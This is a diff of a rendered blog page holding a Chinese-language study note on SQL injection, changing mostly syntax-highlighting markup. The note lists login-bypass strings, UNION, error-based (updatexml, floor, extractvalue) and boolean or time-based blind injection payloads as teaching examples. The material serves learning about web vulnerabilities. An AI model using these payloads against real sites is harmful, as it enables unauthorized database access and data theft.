@@ -194,22 +194,22 @@
         <p>SQL注入是比较常见的网络攻击方式之一，它不是利用操作系统的BUG来实现攻击，而是针对程序员编写时的疏忽，通过SQL语句，实现无账号登录，甚至篡改数据库。</p>
 <span id="more"></span>
 
-<h2 id="SQL基本知识"><a href="#SQL基本知识" class="headerlink" title="SQL基本知识"></a>SQL基本知识</h2><h4 id="Mysql数据库连接与查询"><a href="#Mysql数据库连接与查询" class="headerlink" title="Mysql数据库连接与查询"></a>Mysql数据库连接与查询</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">date_default_timezone_set(<span class="string">&#x27;Asia/Shanghai&#x27;</span>);<span class="comment">//设置时区</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<span class="comment">//设置当前文本编码</span></span><br><span class="line">$server = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">$username = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">$passwd = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">$dbname = <span class="string">&quot;xiaoming&quot;</span>;</span><br><span class="line">$conn = <span class="keyword">new</span> mysqli($server,$username,$passwd,$dbname);</span><br><span class="line"><span class="keyword">if</span> ($conn-&gt;connect_error&lt;&gt;<span class="number">0</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;Error&quot;</span>.$conn-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line">$conn-&gt;set_charset(<span class="string">&#x27;utf8&#x27;</span>)<span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;set charset fail&quot;</span>);</span><br><span class="line">$data =  $conn-&gt;query(<span class="string">&quot;select * from admin&quot;</span>);</span><br><span class="line">var_dump($data-&gt;fetch_array(MYSQL_ASSOC));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="SQL基本知识"><a href="#SQL基本知识" class="headerlink" title="SQL基本知识"></a>SQL基本知识</h2><h4 id="Mysql数据库连接与查询"><a href="#Mysql数据库连接与查询" class="headerlink" title="Mysql数据库连接与查询"></a>Mysql数据库连接与查询</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&#x27;Asia/Shanghai&#x27;</span>);<span class="comment">//设置时区</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<span class="comment">//设置当前文本编码</span></span><br><span class="line"><span class="variable">$server</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$passwd</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;xiaoming&quot;</span>;</span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$server</span>,<span class="variable">$username</span>,<span class="variable">$passwd</span>,<span class="variable">$dbname</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error&lt;&gt;<span class="number">0</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;Error&quot;</span>.<span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">set_charset</span>(<span class="string">&#x27;utf8&#x27;</span>)<span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;set charset fail&quot;</span>);</span><br><span class="line"><span class="variable">$data</span> =  <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from admin&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$data</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQL_ASSOC));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>select 查询语句</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 字段，字段... from 表 where 条件</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 字段，字段... from 表 where 条件</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>insert into 插入语句</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into 表名 (字段，字段...)values(值)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into 表名 (字段，字段...)values(值)</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>update 更新语句</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update 表名 set 字段&#x3D;新值，字段&#x3D;新值 where 条件</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update 表名 set 字段=新值，字段=新值 where 条件</span><br></pre></td></tr></table></figure>
 
 <h4 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h4><ol>
 <li>可回显注入<ul>
@@ -238,7 +238,7 @@
 <li><code>select xxoo into outfile &#39;路径&#39;</code>：权限较高时可直接写文件</li>
 </ul>
 <h2 id="SQL注入漏洞的基本原理、利用和防御"><a href="#SQL注入漏洞的基本原理、利用和防御" class="headerlink" title="SQL注入漏洞的基本原理、利用和防御"></a>SQL注入漏洞的基本原理、利用和防御</h2><p>sql语句拼接，导致sql语句被更改导致查询任意数据/执行命令。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">date_default_timezone_set(<span class="string">&#x27;Asia/Shanghai&#x27;</span>);<span class="comment">//设置时区</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<span class="comment">//设置当前文本编码</span></span><br><span class="line">$server = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">$username = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">$passwd = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">$dbname = <span class="string">&quot;sharing&quot;</span>;</span><br><span class="line">$conn = <span class="keyword">new</span> mysqli($server,$username,$passwd,$dbname);</span><br><span class="line"><span class="keyword">if</span> ($conn-&gt;connect_error&lt;&gt;<span class="number">0</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;Error&quot;</span>.$conn-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line">$conn-&gt;set_charset(<span class="string">&#x27;utf8&#x27;</span>)<span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;set charset fail&quot;</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&#x27;Asia/Shanghai&#x27;</span>);<span class="comment">//设置时区</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<span class="comment">//设置当前文本编码</span></span><br><span class="line"><span class="variable">$server</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$passwd</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;sharing&quot;</span>;</span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$server</span>,<span class="variable">$username</span>,<span class="variable">$passwd</span>,<span class="variable">$dbname</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error&lt;&gt;<span class="number">0</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;Error&quot;</span>.<span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">set_charset</span>(<span class="string">&#x27;utf8&#x27;</span>)<span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;set charset fail&quot;</span>);</span><br></pre></td></tr></table></figure>
 
 <h4 id="后台万能密码"><a href="#后台万能密码" class="headerlink" title="后台万能密码"></a>后台万能密码</h4><ul>
 <li><code>admin&#39; --</code></li>
@@ -259,7 +259,7 @@
 <ul>
 <li>#(mysql)</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DROP sampletable;</span><br><span class="line">#1111</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DROP sampletable;</span><br><span class="line">#1111</span><br></pre></td></tr></table></figure>
 
 <h4 id="多行注释"><a href="#多行注释" class="headerlink" title="多行注释"></a>多行注释</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">此处为注释</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">SELECT</span>  <span class="number">1</span> <span class="keyword">FROM</span> tablename</span><br></pre></td></tr></table></figure>
 
@@ -268,18 +268,18 @@
 </ul>
 <p>order by 原本是对返回结果进行排序的语句</p>
 <p>基本语法：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ORDER BY column_name,column_name ASC|DESC;</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> column_name,column_name <span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure>
 
 <p>这是一个对返回 关联数组以id为依据进行降序排序。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by id desc</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> id <span class="keyword">desc</span></span><br></pre></td></tr></table></figure>
 
 <p>对单个字段可以进行排序对于多个也可</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">order by A,B        这个时候都是默认按升序排列</span><br><span class="line">order by A desc,B   这个时候 A 降序，B 升序排列</span><br><span class="line">order by A ,B desc  这个时候 A 升序，B 降序排列</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">order by A,B        这个时候都是默认按升序排列</span><br><span class="line">order by A desc,B   这个时候 A 降序，B 升序排列</span><br><span class="line">order by A ,B desc  这个时候 A 升序，B 降序排列</span><br></pre></td></tr></table></figure>
 
 <p>当id换成数字1时，发现结果一样，这就说明数字代表的就是第一个字段id，第二个例子也说明order by可以多字段排列。这样我们就可以order by 1,2,3,4…..这样直到内容报错或者内容改变，就可以知道这个表中存在多少个字段。</p>
 <h4 id="判断显注点"><a href="#判断显注点" class="headerlink" title="判断显注点"></a>判断显注点</h4><p>在判断输入点是否存在注入时，可以先假设原程序执行的SQL语句</p>
 <p>如</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Username <span class="keyword">FROM</span> <span class="keyword">User</span> <span class="keyword">WHERE</span> <span class="keyword">id</span> = <span class="string">&#x27;$id&#x27;</span>; //参数为字符串</span><br><span class="line"><span class="keyword">SELECT</span> Username <span class="keyword">FROM</span> <span class="keyword">User</span> <span class="keyword">WHERE</span> <span class="keyword">id</span> = $<span class="keyword">id</span>; //参数为数字</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Username <span class="keyword">FROM</span> <span class="keyword">User</span> <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;$id&#x27;</span>; <span class="operator">/</span><span class="operator">/</span>参数为字符串</span><br><span class="line"><span class="keyword">SELECT</span> Username <span class="keyword">FROM</span> <span class="keyword">User</span> <span class="keyword">WHERE</span> id <span class="operator">=</span> $id; <span class="operator">/</span><span class="operator">/</span>参数为数字</span><br></pre></td></tr></table></figure>
 
 <p>然后可以通过以下几种方法进行判断</p>
 <ol>
@@ -288,10 +288,10 @@
 <li><p><strong>数字型判断</strong>：通过<code>and 1=1 </code>(数字型)和闭合单引号测试语句<code>&#39;and &#39;1&#39;=&#39;1</code> (字符串型)进行判断，这里采用Payload’1’=’1的目的是为了闭合原语句后方的单引号</p>
 </li>
 <li><p><strong>通过数字的加减进行判断</strong>：比如，我们在题目中抓到了链接</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/?id=2</span><br></pre></td></tr></table></figure>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/?id=2</span><br></pre></td></tr></table></figure>
 
 <p>就可以进行如下测试</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/?id=3-1</span><br></pre></td></tr></table></figure>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/?id=3-1</span><br></pre></td></tr></table></figure>
 
 <p>如果结果一致说明id这个输入点可能存在SQL注入漏洞</p>
 </li>
@@ -300,17 +300,17 @@
 <p><img src="/2020/11/25/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/1.png"></p>
 <p>以上的$id变量会以GET参数直接拼接入SQL语句中</p>
 <p>假如此时传入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;union+select+1+--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union+select+1+--+</span><br></pre></td></tr></table></figure>
 
 <p>拼接后SQL语句变为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users WHERE user_id&#x3D;&#39;-1&#39;union select 1 --&#39;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM users WHERE user_id=&#x27;-1&#x27;union select 1 --&#x27;</span><br></pre></td></tr></table></figure>
 
 <p>闭合前面的单引号，注释掉后面的单引号，中间写上需要的Payload就可以了。<em>“+”会被自动处理为空格符</em></p>
 <h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>主要学习3种MYSQL数据库报错注入的方法，分别是updatexml,floor,exp</p>
 <ul>
 <li>updatexml</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,payload,1)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,payload,1)</span><br></pre></td></tr></table></figure>
 
 <p>该语句对输出的字符长度也做了限制，其最长输出32位</p>
 <p>该语句对payload的返回类型也做了限制，只有在payload返回的不是xml格式才会生效</p>
@@ -318,41 +318,41 @@
 <li>floor</li>
 </ul>
 <p>floor报错的原理是rand和order by或groud by的冲突</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat((payload),floor (rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat((payload),floor (rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure>
 
 <p>输出字符长度限制为64个字符</p>
 <ul>
 <li>ExtractValue</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1, payload)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1, payload)</span><br></pre></td></tr></table></figure>
 
 <p>输出字符有长度限制，最长32位。</p>
-<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#布尔盲注可能用到的函数</span><br><span class="line">ascii()#括号中的参数转化成相应的ascii码</span><br><span class="line">ORD()#与ascii()用法类似</span><br><span class="line">hex()#与ascii()用法相似</span><br><span class="line">substr()substr(a,b,c)#从b 位置开始，截取字符串a 的c 长度。</span><br><span class="line">mid()#用法与substr（）类似</span><br><span class="line">length()#返回str字符串的长度</span><br><span class="line">left(database(),1) #取database字符串的左边第一个</span><br></pre></td></tr></table></figure>
+<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#布尔盲注可能用到的函数</span><br><span class="line">ascii()#括号中的参数转化成相应的ascii码</span><br><span class="line">ORD()#与ascii()用法类似</span><br><span class="line">hex()#与ascii()用法相似</span><br><span class="line">substr()substr(a,b,c)#从b 位置开始，截取字符串a 的c 长度。</span><br><span class="line">mid()#用法与substr（）类似</span><br><span class="line">length()#返回str字符串的长度</span><br><span class="line">left(database(),1) #取database字符串的左边第一个</span><br></pre></td></tr></table></figure>
 
 <p>在sql执行成功会返回正确的页面，而执行失败返回错误的页面。例如下面两条语句返回的页面不一样，这样就能判断我们是否猜对</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; and mid(version(),2,1)&#x3D;&#39;.&#39; --+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and mid(version(),2,1)=&#x27;.&#x27; --+</span><br></pre></td></tr></table></figure>
 
 <p><em>语义:mid用于截断版本号的第二位是不是等于“.”如果是则放回TURE否则FALSE</em></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; and mid(version(),2,1)&#x3D;&#39;a&#39; --+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and mid(version(),2,1)=&#x27;a&#x27; --+</span><br></pre></td></tr></table></figure>
 
 <p><em>语义:mid用于截断版本号的第二位是不是等于“a”如果是则放回TURE否则FALSE</em></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#爆出数据库版本：</span><br><span class="line">and mid(version(),1,1)&#x3D;1</span><br><span class="line">#爆出数据库用户：</span><br><span class="line">and ascii(mid(user(),1,1))&gt;18</span><br><span class="line">#爆出表名：</span><br><span class="line">and ascii(mid((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),1,1))</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#爆出数据库版本：</span><br><span class="line">and mid(version(),1,1)=1</span><br><span class="line">#爆出数据库用户：</span><br><span class="line">and ascii(mid(user(),1,1))&gt;18</span><br><span class="line">#爆出表名：</span><br><span class="line">and ascii(mid((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))</span><br></pre></td></tr></table></figure>
 
 <h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><ul>
 <li>IF函数</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IF(exp1,exp2,exp3)#IF语句</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IF(exp1,exp2,exp3)#IF语句</span><br></pre></td></tr></table></figure>
 
 <p>实际举例，若exp1为ture将会返回A否则返回B</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">IF</span>(<span class="literal">TRUE</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>);    <span class="comment">-- 输出结果：A</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">IF</span>(<span class="literal">FALSE</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>);   <span class="comment">-- 输出结果：B</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> IF(<span class="literal">TRUE</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>);    <span class="comment">-- 输出结果：A</span></span><br><span class="line"><span class="keyword">SELECT</span> IF(<span class="literal">FALSE</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>);   <span class="comment">-- 输出结果：B</span></span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>sleep 函数</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep(5)#休眠5秒</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep(5)#休眠5秒</span><br></pre></td></tr></table></figure>
 
 <p>例</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 &#x2F;&#x2F;if 判断语句， 条件为假，执行 sleep</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 //if 判断语句， 条件为假，执行 sleep</span><br></pre></td></tr></table></figure>
 
 
       
@@ -624,18 +624,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">web缓存漏洞</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">Http请求走私</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">学习笔记</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">writeup</a>
               </li>
              
@@ -645,6 +633,18 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">CSP</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">学习笔记</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">web缓存漏洞</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">Http请求走私</a>
               </li>
              
               <li class="article-tag-list-item">
